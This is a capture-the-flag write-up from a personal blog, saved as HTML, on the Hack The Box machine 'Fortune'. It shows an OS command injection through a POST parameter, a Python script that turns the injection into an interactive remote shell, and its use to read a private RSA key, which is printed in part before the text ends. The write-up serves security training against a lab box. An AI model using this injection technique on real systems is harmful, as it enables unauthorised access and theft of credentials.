<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Fortune | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Hack The Box - Fortune" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Quick Summary Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box LaCasaDePapel it had RCE and client certificate generation to access a restricted https service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is 10.10.10.127, I added it to /etc/hosts as fortune.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC fortune.htb We have http, https on port 80, port 443 and we have ssh on port 22 so we will be focusing on the web services. HTTP Initial Enumeration The index page on http://fortune.htb is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database : On https://fortune.htb we get a handshake error, this probably means that we need a client certificate. RCE, Client Certificate Generation Back to http://fortune.htb I intercepted the request with burp and there was only one parameter in the POST request called db, after trying some different things I could get RCE by appending a semi-colon ; : Request : ``` POST /select HTTP/1.1 Host: fortune.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://fortune.htb/ Content-Type: application/x-www-form-urlencoded Content-Length: 7 Connection: close Upgrade-Insecure-Requests: 1" />
<meta property="og:description" content="Quick Summary Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box LaCasaDePapel it had RCE and client certificate generation to access a restricted https service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is 10.10.10.127, I added it to /etc/hosts as fortune.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC fortune.htb We have http, https on port 80, port 443 and we have ssh on port 22 so we will be focusing on the web services. HTTP Initial Enumeration The index page on http://fortune.htb is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database : On https://fortune.htb we get a handshake error, this probably means that we need a client certificate. RCE, Client Certificate Generation Back to http://fortune.htb I intercepted the request with burp and there was only one parameter in the POST request called db, after trying some different things I could get RCE by appending a semi-colon ; : Request : ``` POST /select HTTP/1.1 Host: fortune.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://fortune.htb/ Content-Type: application/x-www-form-urlencoded Content-Length: 7 Connection: close Upgrade-Insecure-Requests: 1" />
<link rel="canonical" href="http://localhost:4000/hack-the-box/fortune/" />
<meta property="og:url" content="http://localhost:4000/hack-the-box/fortune/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/hackthebox/fortune/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-08-03T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"Quick Summary Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box LaCasaDePapel it had RCE and client certificate generation to access a restricted https service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is 10.10.10.127, I added it to /etc/hosts as fortune.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC fortune.htb We have http, https on port 80, port 443 and we have ssh on port 22 so we will be focusing on the web services. HTTP Initial Enumeration The index page on http://fortune.htb is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database : On https://fortune.htb we get a handshake error, this probably means that we need a client certificate. RCE, Client Certificate Generation Back to http://fortune.htb I intercepted the request with burp and there was only one parameter in the POST request called db, after trying some different things I could get RCE by appending a semi-colon ; : Request : ``` POST /select HTTP/1.1 Host: fortune.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://fortune.htb/ Content-Type: application/x-www-form-urlencoded Content-Length: 7 Connection: close Upgrade-Insecure-Requests: 1","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/fortune/","image":"http://localhost:4000/hackthebox/fortune/0.png","headline":"Hack The Box - Fortune","dateModified":"2019-08-03T00:00:00+02:00","datePublished":"2019-08-03T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/fortune/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/tagbuttons.css">
  <link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Fortune</h1>
    <p class="post-meta">
      <h7>
        Tags: 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/BSD/';">BSD</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Exploit Development/';">Exploit Development</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Networking/';">Networking</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Pivoting/';">Pivoting</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/ssh/';">ssh</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/php/';">php</button> 
        
      </h7>
      <br>
      <time class="dt-published" datetime="2019-08-03T00:00:00+02:00" itemprop="datePublished">Aug 3, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h3 id="quick-summary">Quick Summary</h3>
<h4 id="hey-guys-today-fortune-retired-and-heres-my-write-up-about-it-it-was-a-very-cool-box-and-i-really-liked-it-like-the-last-retired-box-lacasadepapel-it-had-rce-and-client-certificate-generation-to-access-a-restricted-https-service-but-thats-only-for-the-initial-steps-as-this-box-had-a-lot-of-interesting-stuff-its-an-openbsd-box-and-its-ip-is-101010127-i-added-it-to-etchosts-as-fortunehtb-lets-jump-right-in-">Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box <a href="/hack-the-box/lacasadepapel">LaCasaDePapel</a> it had <code class="highlighter-rouge">RCE</code> and client certificate generation to access a restricted <code class="highlighter-rouge">https</code> service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is <code class="highlighter-rouge">10.10.10.127</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">fortune.htb</code>. Let’s jump right in !</h4>
<p><img src="/images/hackthebox/fortune/0.png" alt="" /></p>
<hr />

<h3 id="nmap">Nmap</h3>
<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :</h4>
<p><code class="highlighter-rouge">nmap -sV -sT -sC fortune.htb</code>
<img src="/images/hackthebox/fortune/1.png" alt="" /></p>
<h4 id="we-have-http-https-on-port-80-port-443-and-we-have-ssh-on-port-22-so-we-will-be-focusing-on-the-web-services">We have <code class="highlighter-rouge">http</code>, <code class="highlighter-rouge">https</code> on port 80, port 443 and we have <code class="highlighter-rouge">ssh</code> on port 22 so we will be focusing on the web services.</h4>
<p><br /></p>
<hr />

<h3 id="http-initial-enumeration">HTTP Initial Enumeration</h3>
<h4 id="the-index-page-on-httpfortunehtb-is-pretty-simple-we-have-some-options-where-we-can-choose-a-database-of-fortunes-and-we-will-get-a-random-fortune-from-that-database-">The index page on <code class="highlighter-rouge">http://fortune.htb</code> is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :</h4>
<p><img src="/images/hackthebox/fortune/2.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/fortune/3.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/fortune/4.png" alt="" /></p>
<h4 id="on-httpsfortunehtb-we-get-a-handshake-error-this-probably-means-that-we-need-a-client-certificate">On <code class="highlighter-rouge">https://fortune.htb</code> we get a handshake error, this probably means that we need a client certificate.</h4>
<p><img src="/images/hackthebox/fortune/5.png" alt="" /></p>
<hr />

<h3 id="rce-client-certificate-generation">RCE, Client Certificate Generation</h3>
<h4 id="back-to-httpfortunehtb-i-intercepted-the-request-with-burp-and-there-was-only-one-parameter-in-the-post-request-called-db-after-trying-some-different-things-i-could-get-rce-by-appending-a-semi-colon--">Back to <code class="highlighter-rouge">http://fortune.htb</code> I intercepted the request with burp and there was only one parameter in the POST request called <code class="highlighter-rouge">db</code>, after trying some different things I could get <code class="highlighter-rouge">RCE</code> by appending a semi-colon <code class="highlighter-rouge">;</code> :</h4>
<h4 id="request-">Request :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /select HTTP/1.1
Host: fortune.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://fortune.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 7
Connection: close
Upgrade-Insecure-Requests: 1

db=;pwd
</code></pre></div></div>
<h4 id="response-">Response :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Date: Fri, 02 Aug 2019 11:08:49 GMT
Server: OpenBSD httpd
Content-Length: 680

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Your fortune<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">'viewport'</span> <span class="na">content=</span><span class="s">'width=device-width, initial-scale=1'</span><span class="nt">&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;h2&gt;</span>Your fortune is:<span class="nt">&lt;/h2&gt;</span>
<span class="nt">&lt;p&gt;&lt;pre&gt;</span>

Bagbiter:
	1. n.; Equipment or program that fails, usually
intermittently.  2. adj.:  Failing hardware or software.  <span class="ni">&amp;#34;</span>This
bagbiting system won<span class="ni">&amp;#39;</span>t let me get out of spacewar.<span class="ni">&amp;#34;</span>  Usage:  verges on
obscenity.  Grammatically separable; one may speak of <span class="ni">&amp;#34;</span>biting the
bag<span class="ni">&amp;#34;</span>.  Synonyms: LOSER, LOSING, CRETINOUS, BLETCHEROUS, BARFUCIOUS,
CHOMPER, CHOMPING.
/var/appsrv/fortune


<span class="nt">&lt;/pre&gt;&lt;p&gt;</span>
<span class="nt">&lt;p&gt;</span>Try <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'/'</span><span class="nt">&gt;</span>again<span class="nt">&lt;/a&gt;</span>!<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<h4 id="i-couldnt-get-a-reverse-shell-get-ssh-or-read-the-user-flag-so-we-are-going-to-enumerate-the-box-through-this-rce-for-some-time">I couldn’t get a reverse shell, get <code class="highlighter-rouge">ssh</code> or read the user flag so we are going to enumerate the box through this <code class="highlighter-rouge">RCE</code> for some time.</h4>
<h4 id="i-wrote-a-script-to-make-it-easier-">I wrote a script to make it easier :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
	<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"db"</span><span class="p">:</span><span class="n">payload</span><span class="p">}</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.127/select"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
	<span class="k">return</span> <span class="n">response</span>

<span class="k">def</span> <span class="nf">filter</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
	<span class="n">start</span> <span class="o">=</span> <span class="s">"rce_result"</span>
	<span class="n">end</span> <span class="o">=</span> <span class="s">"rce_result_end"</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="n">response</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">start</span><span class="p">)</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">start</span><span class="p">):</span><span class="n">response</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="n">end</span><span class="p">)]</span>
	<span class="k">return</span> <span class="n">result</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">rce</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[?] command : "</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="s">";echo rce_result;{};echo rce_result_end"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rce</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">result</span> <span class="o">=</span> <span class="nb">filter</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Result :"</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</code></pre></div></div>
<h4 id="this-script-takes-the-command-to-execute-then-sends-the-payload-which-is-echo-rce_resultcommandecho-rce_result_end-then-it-searches-through-the-response-and-prints-the-string-between-rce_result-and-rce_result_end-which-is-the-output-of-our-command">This script takes the command to execute then sends the payload which is <code class="highlighter-rouge">;echo rce_result;COMMAND;echo rce_result_end</code> then it searches through the response and prints the string between <code class="highlighter-rouge">rce_result</code> and <code class="highlighter-rouge">rce_result_end</code> which is the output of our command.</h4>
<p><img src="/images/hackthebox/fortune/6.png" alt="" /></p>
<h4 id="there-are-3-users-on-the-box--bob-charlie-and-nfsuser-">There are 3 users on the box : <code class="highlighter-rouge">bob</code>, <code class="highlighter-rouge">charlie</code> and <code class="highlighter-rouge">nfsuser</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] command : ls -la /home
[*] Result :

total 20
drwxr-xr-x   5 root     wheel    512 Nov  2  2018 .
drwxr-xr-x  13 root     wheel    512 Aug  2 05:47 ..
drwxr-xr-x   5 bob      bob      512 Nov  3  2018 bob
drwxr-x---   3 charlie  charlie  512 Aug  2 06:21 charlie
drwxr-xr-x   2 nfsuser  nfsuser  512 Nov  2  2018 nfsuser
</code></pre></div></div>
<h4 id="in-bobs-home-directory-there-was-a-directory-called-ca-">In <code class="highlighter-rouge">bob</code>’s home directory there was a directory called <code class="highlighter-rouge">ca</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] command : ls -la /home/bob
[*] Result :

total 48
drwxr-xr-x  5 bob   bob    512 Nov  3  2018 .
drwxr-xr-x  5 root  wheel  512 Nov  2  2018 ..
-rw-r--r--  1 bob   bob     87 Oct 11  2018 .Xdefaults
-rw-r--r--  1 bob   bob    771 Oct 11  2018 .cshrc
-rw-r--r--  1 bob   bob    101 Oct 11  2018 .cvsrc
-rw-r--r--  1 bob   bob    359 Oct 11  2018 .login
-rw-r--r--  1 bob   bob    175 Oct 11  2018 .mailrc
-rw-r--r--  1 bob   bob    215 Oct 11  2018 .profile
-rw-------  1 bob   bob     13 Nov  3  2018 .psql_history
drwx------  2 bob   bob    512 Nov  2  2018 .ssh
drwxr-xr-x  7 bob   bob    512 Oct 29  2018 ca
drwxr-xr-x  2 bob   bob    512 Nov  2  2018 dba
</code></pre></div></div>
<h4 id="i-enumerated-that-directory-for-some-time-and-there-was-a-directory-called-intermediate-where-i-found-a-certificate-and-a-key-">I enumerated that directory for some time and there was a directory called <code class="highlighter-rouge">intermediate</code> where I found a certificate and a key :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] command : ls -la /home/bob/ca
[*] Result :

total 56
drwxr-xr-x  7 bob  bob   512 Oct 29  2018 .
drwxr-xr-x  5 bob  bob   512 Nov  3  2018 ..
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 certs
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
-rw-r--r--  1 bob  bob   115 Oct 29  2018 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
-rw-r--r--  1 bob  bob     0 Oct 29  2018 index.txt.old
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 intermediate
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
-rw-r--r--  1 bob  bob  4200 Oct 29  2018 openssl.cnf
drwx------  2 bob  bob   512 Oct 29  2018 private
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old

[?] command : ls -la /home/bob/ca/intermediate
[*] Result :

total 60
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 .
drwxr-xr-x  7 bob  bob   512 Oct 29  2018 ..
drwxr-xr-x  2 bob  bob   512 Nov  3  2018 certs
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
-rw-r--r--  1 bob  bob     5 Oct 29  2018 crlnumber
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 csr
-rw-r--r--  1 bob  bob   107 Oct 29  2018 index.txt
-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
-rw-r--r--  1 bob  bob  4328 Oct 29  2018 openssl.cnf
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 private
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old

[?] command : ls -la /home/bob/ca/intermediate/certs
[*] Result :

total 32
drwxr-xr-x  2 bob  bob   512 Nov  3  2018 .
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
-r--r--r--  1 bob  bob  4114 Oct 29  2018 ca-chain.cert.pem
-r--r--r--  1 bob  bob  1996 Oct 29  2018 fortune.htb.cert.pem
-r--r--r--  1 bob  bob  2061 Oct 29  2018 intermediate.cert.pem

[?] command : ls -la /home/bob/ca/intermediate/private
[*] Result :

total 20
drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
-r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
-rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem

[?] command : cat /home/bob/ca/intermediate/certs/intermediate.cert.pem
[*] Result :

-----BEGIN CERTIFICATE-----                           
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
-----END CERTIFICATE-----

[?] command : cat /home/bob/ca/intermediate/private/intermediate.key.pem
[*] Result :


-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAuTGpzUbl4RIyDuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6N
TzZAjOvCAJu7tiJjnvrUxf4SzuLRQEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd9
9fN/MDz288Rv7Z24LKWvPoEFWU5DSpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1o
W/kbz9205JT1LvR+mqNWbH/0Q92K7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI9
7sB6jXxlgHzblwFlQaHvh6H7u6rCm/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL
6YmfIsPJdu4NoeEeXofqwQjNf2bsjgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/S
ybEGB3vBe4e+wvzkT7YD4lqubvXZO346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVo
KmimYUWi2fJ/1B2PgRrzv/mmlgL7JOpJNWMUbc8bEf698QziuCXj5R/+Lover058
nrvCAnI4I4wUHTGAgOC1J4hbVoYXEjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xp
ANJIlxH0gwaTQ4a8HAPBliHnEV0vXK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb
7K4H1yh5VF9zkLCTN6WYoaSM1Z0Tnb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEA
AQKCAgEAkjfD+W+g0LOtElN2TtYewtRAPVYc+9ogRKq28PUtpEemGccLix8qmBkM
c66B5qwAO+WPWUPhVbd/v2OIiqQYbnfGe7p1klwCg7sYlg2ilyaLX2tA6I/4O/3m
fVD7joCYiafHVXJI5toEBz4znHdidokaQOODcE0A9ig1pIuKrX3Ktghl/TgR3W0P
BesWKpyf2ThdZA0irvKcXaY3fpxBOxho5CV8WW8KpBld70Uu79v0OdGPVJJkMJGn
EmuCdReE+u0AUfZy6xlHzhs5/DUEwkP3gwSCs0IICyDnEQPkfn3cOIKCdUFTg/9R
cbVCzi0P7VMi5oYsugppezeBjiX+EDQogYDpSF94aFy8FdG6UgGLUpicNyG93niL
iXTJ0X0MS1E1AWSvECguIuUaNuDW+ZOdMCGoKKVCjTzHGvMunSP5ibIhSprhf4v0
KrBxalXAZafq6jVrEkQkNQrVVaodkFMFH4+J3Sa8Zi1mOiQ9xFmGMV+8AUiz899J
4PHcf7WzLb/FilyhwIM3HPSI7n3mJ0x7xkuQ3COxioVbvCkz0fAaQzz1U8h/pFxV
+wfx2X5F3N8RzU5ufR/M/Asni8RId7M8TJ44qWQln8itM+0aWTKiLrhBOcC55eug
hHIop2z+amPqxsynTVbbmiVwGpCYGNt3Q/7/FovcxF36hkbULwECggEBAPPgQwX4
gL9PBBwSi2oCS+164tSTc0B3R31B0AatewdXyASNYml9rCTOa/VJntvIAHDvWQ3+
wfrf34/1DIdZttwPYpcKAiWz/CXqPqEhd3uFLOrRoo1xBaenwLvCI99cYEvcrQIF
ctBDsqGytJ/Begs7dg04KLZUbsoYVTzkwf9O0I1aEHY4r9cUfXyPBYFl1qJdJoY1
83sZAZo+DXLdmtXVpoM/8MlhnMfg9VQ+txrMZg+1zEiuiNY9Rmv6CDpx68WcNKxF
y6mEkR8Ux3ZdHht/9azTU9n2btsx3EPBviwgiXuPLdCwyjfopcUaj+2cX9n5dO5E
HFZXUnQKj5UgttcCggEBAMJmkplp9ofzkF17Z+B6u/PJHmFKBn/PgD1NKBlGINIY
wh/3mFq1AvqHqy9Y9q9H+S/rIr8i+ADi39lWUywYWbGxpTJ6q68tKJR2UVxP0otZ
CRqtqV/BUhADeXrxnSdTEtA9CTgLEn+fHbDGwzW1nhB/EsEfQFQBx31juR2k5kR3
